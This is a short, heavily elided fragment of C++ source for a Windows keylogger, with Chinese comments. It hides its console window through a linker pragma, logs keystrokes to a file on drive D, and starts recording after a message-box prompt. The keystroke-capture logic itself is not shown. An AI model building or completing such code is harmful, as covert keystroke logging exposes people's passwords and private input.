...
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 设置入口地址,实现控制台窗口不显示
...
int Keyloggers()
{
	...
	string FileName = "D:\\Keyboard log.txt";
...
int Box()
{
	if (MessageBox(NULL, "记录文件：D:/Keyboard log.txt", "开始记录？", MB_OKCANCEL) == 1)
	{
		cout << "正在记录用户操作！";
		Keyloggers();
		return 0;
